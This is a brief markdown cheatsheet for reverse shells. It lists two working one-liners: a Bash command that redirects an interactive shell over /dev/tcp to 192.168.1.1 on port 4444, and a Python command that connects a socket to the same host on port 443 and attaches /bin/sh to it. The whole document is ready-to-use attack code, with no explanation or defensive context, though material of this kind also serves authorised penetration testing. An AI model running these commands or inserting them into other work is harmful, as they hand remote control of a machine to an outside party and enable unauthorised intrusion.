#### Reverse Shell Cheatsheet

* BASH
```
bash -i >& /dev/tcp/192.168.1.1/4444 0>&1
```

* PYTHON
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
